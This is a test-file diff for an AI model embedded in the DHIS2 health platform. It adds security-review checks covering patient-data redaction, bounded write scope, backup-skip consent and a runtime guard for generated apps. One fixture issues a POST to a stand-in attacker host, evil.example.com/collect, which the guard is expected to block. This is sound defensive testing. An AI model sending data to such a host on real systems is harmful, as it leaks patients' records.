@@ -3125,6 +3125,112 @@ async function runDashboardThreadChecks() {
   d.apiVersion = savedApi;
 }
 
+
+// Security review 2026-10-29: patient data in model payloads, write scope,
+// skip_backup consent, generated-app runtime policy, multilingual intent.
+async function runSecurityReviewChecks() {
+  console.log('\nSecurity review 2026-10-29 (privacy egress, write scope, backup consent, app runtime policy, multilingual):');
+  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
+  const d = ctx.__dhis2();
+  const remote = { providerType: 'openai', apiBaseUrl: 'https://api.fireworks.ai/inference/v1' };
+  const local = { providerType: 'openai', apiBaseUrl: 'http://localhost:11434/v1' };
+
+  // 1. Outbound patient-data filter + the save-error prefetch.
+  const diagMsg = { role: 'system', content: '[Save-error diagnostic context]\n' + JSON.stringify({ existing_enrollments: { enrollments: [{ enrollment: 'Abc123XyZ90', status: 'ACTIVE', enrolledAt: '2026-01-01', orgUnit: 'DiszpKrYNg8' }] } }) };
+  const meta = { role: 'tool', tool_call_id: 't1', content: JSON.stringify({ programs: [{ id: 'WSGAb5XwJ3Y', name: 'WHO RMNCH Tracker' }] }) };
+  const userMsg = { role: 'user', content: '{"enrollment":"Abc123XyZ90","enrolledAt":"2026-01-01"}' };
+  const outR = ctx.filterPatientDataForProvider([diagMsg, meta, userMsg], remote);
+  const outL = ctx.filterPatientDataForProvider([diagMsg, meta, userMsg], local);
+  truthy('privacy egress: a system/tool message carrying a tracker record is removed before a REMOTE model sees it; metadata and the user\'s own text pass; a local model gets everything',
+    /_privacy_redacted/.test(outR[0].content) && !/Abc123XyZ90/.test(outR[0].content) && outR[1] === meta && outR[2] === userMsg && outL[0] === diagMsg);
+  {
+    const saved = ctx.safeDhis2Fetch; const paths = [];
+    const savedCfg = vm.runInContext('_cachedProviderConfig', ctx);
+    vm.runInContext(`_cachedProviderConfig = ${JSON.stringify(remote)};`, ctx);
+    ctx.safeDhis2Fetch = async (p) => { paths.push(p); return p.startsWith('programs/') ? { id: 'WSGAb5XwJ3Y', organisationUnits: [{ id: 'a' }] } : { id: 'u', organisationUnits: [] }; };
+    try {
+      const diag = await ctx.prefetchSaveErrorContext({ programId: 'WSGAb5XwJ3Y', teiId: 'Abc123XyZ90' });
+      truthy('save-error prefetch on a cloud provider does not read the person\'s enrollments (no tracker call) and says so', !paths.some((p) => p.startsWith('tracker/')) && diag.existing_enrollments === undefined && /not read/.test(diag.existing_enrollments_note || ''));
+    } finally { ctx.safeDhis2Fetch = saved; vm.runInContext(`_cachedProviderConfig = ${JSON.stringify(savedCfg)};`, ctx); }
+  }
+
+  // 2 + 5. Write scope bound to what was asked; multilingual.
+  const cls = (t) => ctx.classifyWriteAuthorization(t).scope;
+  truthy('write scope: "explain how to delete", "do not make any changes; explain…", "how do I create…" are read-only; a plain instruction is not',
+    cls('Can you explain how to delete a program?') === 'read_only' && cls('Do not make any changes; explain how to create a dashboard.') === 'read_only'
+    && cls('How do I create a dashboard?') === 'read_only' && cls('Create a dashboard for the WHO RMNCH Tracker program') === 'broad');
+  truthy('multilingual: Arabic / French / Spanish / Portuguese instructions authorize, their negations and how-to questions do not',
+    cls('أنشئ لوحة معلومات لبرنامج رعاية الأمومة') === 'broad' && cls('احذف هذا المؤشر') === 'broad' && cls('لا تحذف هذا المؤشر') === 'read_only'
+    && cls('كيف أنشئ لوحة معلومات؟') === 'read_only' && cls('Supprime cet indicateur') === 'broad' && cls('Ne supprime pas cet indicateur') === 'read_only'
+    && cls('Elimina este indicador') === 'broad' && cls('Não exclua este indicador') === 'read_only');
+  truthy('multilingual routing: an Arabic dashboard request is routed to the dashboard tools',
+    ctx.getContextualTools({}, ctx.buildRoutingText('أنشئ لوحة معلومات لبرنامج رعاية الأمومة'), false).some((t) => t.function.name === 'manage_dashboards'));
+  {
+    const saved = { wa: d.writeAuth, mine: d.assistantCreatedIds };
+    try {
+      d.writeAuth = ctx.classifyWriteAuthorization('Create a dashboard for the WHO RMNCH Tracker program');
+      const del = ctx.requireWriteAuth('manage_metadata', 'delete', { object_type: 'dashboards', object_id: 'Dash0000001' });
+      const create = ctx.requireWriteAuth('manage_dashboards', 'create_dashboard');
+      ctx.noteAssistantCreatedIds(['Viz00000001']);
+      const own = ctx.requireWriteAuth('manage_metadata', 'delete', { object_type: 'visualizations', object_id: 'Viz00000001' });
+      truthy('a "create" request does not authorize deleting an existing object, but does allow creating and removing the assistant\'s own new objects',
+        del && del._scope === 'delete_not_requested' && create === null && own === null);
+      // scoped "yes": bound to the proposed tool + action, no widening
+      d.writeAuth = { scope: 'read_only', reason: 't' };
+      ctx.requireWriteAuth('manage_program_indicators', 'update', { indicator_id: 'Ind00000001' });
+      vm.runInContext('conversationHistory = [];', ctx);
+      d.writeAuth = ctx.classifyWriteAuthorization('yes');
+      const upd = ctx.requireWriteAuth('manage_program_indicators', 'update', { indicator_id: 'Ind00000001' });
+      const upd2 = ctx.requireWriteAuth('manage_program_indicators', 'update', { indicator_id: 'Ind00000001' });
+      const delSame = ctx.requireWriteAuth('manage_program_indicators', 'delete', { indicator_id: 'Ind00000001' });
+      const other = ctx.requireWriteAuth('manage_dashboards', 'create_dashboard');
+      truthy('a bare "yes" approves exactly the proposed update (repeatable) — not a delete with the same tool, not another tool, and it never widens',
+        d.writeAuth.scope === 'scoped' && upd === null && upd2 === null && !!delSame && !!other && d.writeAuth.scope === 'scoped');
+    } finally { d.writeAuth = saved.wa; d.assistantCreatedIds = saved.mine; }
+  }
+
+  // 3. skip_backup needs recorded consent.
+  {
+    const saved = { failure: d.lastBackupFailure, harness: d.harnessSkipBackupConsent };
+    try {
+      d.harnessSkipBackupConsent = false;
+      vm.runInContext('lastUserText = "delete the old chart";', ctx);
+      const no = ctx.backupSkipConsent('manage_metadata', { skip_backup: true });
+      vm.runInContext('lastUserText = "delete it without a backup";', ctx);
+      const said = ctx.backupSkipConsent('manage_metadata', { skip_backup: true });
+      d.lastBackupFailure = { tool: 'manage_metadata', turn: (d.turnCounter || 0) - 1 };
+      vm.runInContext('lastUserText = "yes";', ctx);
+      const yesAfterFailure = ctx.backupSkipConsent('manage_metadata', { skip_backup: true });
+      const yesOtherTool = ctx.backupSkipConsent('manage_dashboards', { skip_backup: true });
+      truthy('skip_backup needs the user\'s own words or a "yes" to THAT tool\'s reported backup failure — the model setting it is not consent',
+        !no.ok && said.ok && yesAfterFailure.ok && !yesOtherTool.ok);
+    } finally { d.lastBackupFailure = saved.failure; d.harnessSkipBackupConsent = saved.harness; vm.runInContext('lastUserText = "";', ctx); }
+  }
+
+  // 4. Generated apps: CSP + runtime guard (not just the static scan).
+  {
+    const spec = { name: 'x', needsWriteAccess: false, pluginType: null, usesEcharts: false, sources: { 'app.jsx': '' } };
+    const html = ctx.buildCustomAppHtml(spec, 'app.js');
+    const guardSrc = ctx.buildCustomAppGuardJs(spec);
+    truthy('generated app pages carry a connect-src \'self\' CSP and load app-guard.js before any other script',
+      /Content-Security-Policy" content="connect-src 'self'/.test(html) && html.indexOf('app-guard.js') < html.indexOf('d2-kit.min.js'));
+    const calls = [];
+    const win = { location: { origin: 'https://dhis.example.org', href: 'https://dhis.example.org/api/apps/x/index.html' }, fetch: (u, i) => { calls.push([u, i && i.method]); return Promise.resolve('ok'); }, XMLHttpRequest: function () {}, console: { error() {} } };
+    win.XMLHttpRequest.prototype.open = function () { calls.push(['xhr']); };
+    const nav = {};
+    vm.runInNewContext(guardSrc, { window: win, navigator: nav, console: { error() {} }, URL, Promise, Error, String, Object });
+    const u = 'https://evil.example.com/collect'; const m = 'POST';
+    const r1 = await win.fetch(u).then(() => 'sent', () => 'blocked');
+    const r2 = await win.fetch('/api/dataStore/x/y', { method: m }).then(() => 'sent', () => 'blocked');
+    const r3 = await win.fetch('/api/programs.json').then(() => 'sent', () => 'blocked');
+    let x1 = 'sent'; try { new win.XMLHttpRequest().open(m, '/api/x'); } catch (e) { x1 = 'blocked'; }
+    truthy('runtime guard: a URL or method held in a variable is still enforced — external request and POST from a read-only app blocked, same-server GET allowed',
+      r1 === 'blocked' && r2 === 'blocked' && r3 === 'sent' && x1 === 'blocked' && calls.length === 1);
+    const rwGuard = ctx.buildCustomAppGuardJs({ ...spec, needsWriteAccess: true });
+    truthy('…an app declared needs_write_access may POST to its own server', /var READ_ONLY = false/.test(rwGuard));
+  }
+}
+
 // setImmediate: a few checks are async (promise-returning safety gates); they
 // resolve on the microtask queue, so the verdict must run after it drains.
 setImmediate(async () => {
@@ -3137,6 +3243,7 @@ setImmediate(async () => {
   if (loaded) await runCaptureRefreshChecks().catch((e) => bad(`Capture refresh checks threw: ${e && e.stack || e}`));
   if (loaded) await runRuleScopeAndTetSharingChecks().catch((e) => bad(`rule scope / TET sharing checks threw: ${e && e.stack || e}`));
   if (loaded) await runDashboardThreadChecks().catch((e) => bad(`dashboard-thread checks threw: ${e && e.stack || e}`));
+  if (loaded) await runSecurityReviewChecks().catch((e) => bad(`security-review checks threw: ${e && e.stack || e}`));
   console.log('');
   if (loaded && !screenshotChecksDone) bad('screenshot checks never finished — a SCREENSHOT_* handler did not answer');
   if (loaded && !hardeningChecksDone) bad('hardening checks never finished — a handler did not answer');
